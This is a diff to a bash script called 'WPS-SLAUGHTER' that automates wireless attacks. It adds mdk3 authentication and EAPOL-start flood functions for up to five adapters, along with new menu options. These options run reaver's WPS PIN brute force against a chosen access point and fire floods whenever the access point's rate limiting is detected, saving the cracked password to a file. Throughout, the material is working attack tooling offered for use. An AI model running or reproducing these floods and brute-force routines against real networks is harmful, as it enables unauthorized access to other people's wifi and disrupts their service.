@@ -15,16 +15,72 @@ echo "
 ██║ █╗ ██║██████╔╝███████╗█████╗███████╗██║     ███████║██║   ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝
 ██║███╗██║██╔═══╝ ╚════██║╚════╝╚════██║██║     ██╔══██║██║   ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗
 ╚███╔███╔╝██║     ███████║      ███████║███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
- ╚══╝╚══╝ ╚═╝     ╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+╚══╝╚══╝ ╚═╝     ╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
 
 "
 
-echo "WPS-SLAUGHTER BY: APATHETIC EUPHORIA"
+echo "WPS-SLAUGHTER BY: Apathetic Euphoria"
+echo "+ Help and Support from Aanarchyy"
 
 sleep 3
 clear
 
 sudo rfkill unblock all
+
+################################## Functions For MDK3 ########################################
+
+run_mdk3_ASOC1()
+{
+	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m"
+}
+
+run_mdk3_EAPOL1()
+{
+	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250"
+}
+
+run_mdk3_ASOC2()
+{
+	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m"
+}
+
+run_mdk3_EAPOL2()
+{
+	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250"
+}
+
+run_mdk3_ASOC3()
+{
+	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m"
+}
+
+run_mdk3_EAPOL3()
+{
+	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250"
+}
+
+run_mdk3_ASOC4()
+{
+	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m"
+}
+
+run_mdk3_EAPOL4()
+{
+	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250"
+}
+
+run_mdk3_ASOC5()
+{
+	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m"
+}
+
+run_mdk3_EAPOL5()
+{
+	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250"
+}
+
+##################################End Of Functions For MDK3 ########################################
+
 
 echo "************** - How Many Wlan Adapters Would You Like To Use? - ************** 
 1)1 Adapter
@@ -85,6 +141,7 @@ esac
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
 
 echo 
+clear
 read -p " - What is the BSSID(MAC) of the Target - ": BSSID;
 clear
 echo 
@@ -101,7 +158,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
-4)Check if Access Point WPS is UNLOCKED"
+4)Check if Access Point WPS is UNLOCKED
+5)Reaver with AutoFlood(ASOC)
+6)Reaver with AutoFlood(EAPOL)
+
+*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
 
 read d
 case $d in
@@ -117,12 +178,44 @@ menu
 ;;
 	3)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ~TmpReaverOutput.txt 
+DETECT_RATE_LIMITING= tail -n 1 ~TmpReaverOutput.txt
+while [ "$DETECT_RATE_LIMITING" = "[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking" ]; do
+gnome-terminal  --geometry=1x2 --title='Flood Attack in Progess' -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250"
+done
 menu
 ;;
 	4)
 clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
+menu
+;;
+	5)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_ASOC1
+    fi
+    sleep 1
+done
+menu
+;;
+	6)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL1
+    fi
+    sleep 1
+done
 menu
 ;;
 	*)Invalid Option
@@ -208,7 +301,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
-4)Check if Access Point WPS is UNLOCKED"
+4)Check if Access Point WPS is UNLOCKED
+5)Reaver with AutoFlood(ASOC)
+6)Reaver with AutoFlood(EAPOL)
+
+*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
 
 read g
 case $g in
@@ -230,6 +327,34 @@ menu
 	4)
 clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
+menu
+;;
+	5)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_ASOC2
+    fi
+    sleep 1
+done
+menu
+;;
+	6)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL2
+    fi
+    sleep 1
+done
 menu
 ;;
 	*)Invalid Option
@@ -326,7 +451,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
-4)Check if Access Point WPS is UNLOCKED"
+4)Check if Access Point WPS is UNLOCKED
+5)Reaver with AutoFlood(ASOC)
+6)Reaver with AutoFlood(EAPOL)
+
+*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
 
 read j
 case $j in
@@ -348,6 +477,34 @@ menu
 	4)
 clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
+menu
+;;
+	5)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_ASOC3
+    fi
+    sleep 1
+done
+menu
+;;
+	6)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL3
+    fi
+    sleep 1
+done
 menu
 ;;
 	*)Invalid Option
@@ -457,7 +614,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
-4)Check if Access Point WPS is UNLOCKED"
+4)Check if Access Point WPS is UNLOCKED
+5)Reaver with AutoFlood(ASOC)
+6)Reaver with AutoFlood(EAPOL)
+
+*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
 
 read m
 case $m in
@@ -479,6 +640,34 @@ menu
 	4)
 clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
+menu
+;;
+	5)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_ASOC4
+    fi
+    sleep 1
+done
+menu
+;;
+	6)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL4
+    fi
+    sleep 1
+done
 menu
 ;;
 	*)Invalid Option
@@ -600,7 +789,11 @@ echo "************** - Which Attack Would You Like To Use? - **************
 1)EAPOL Start Flood 
 2)Authentication Flood
 3)Reaver
-4)Check if Access Point WPS is UNLOCKED"
+4)Check if Access Point WPS is UNLOCKED
+5)Reaver with AutoFlood(ASOC)
+6)Reaver with AutoFlood(EAPOL)
+
+*AutoFlood Attacks will store the Password in Root/ReaverOutput.txt Once found*"
 
 read p
 case $p in
@@ -622,6 +815,34 @@ menu
 	4)
 clear
 gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
+menu
+;;
+	5)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_ASOC5
+    fi
+    sleep 1
+done
+menu
+;;
+	6)
+clear
+reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv >> ReaverOutput.txt &
+reaver_pid=$! 
+
+while kill -0 $reaver_pid ; do
+    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
+    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
+	run_mdk3_EAPOL5
+    fi
+    sleep 1
+done
 menu
 ;;
 	*)Invalid Option
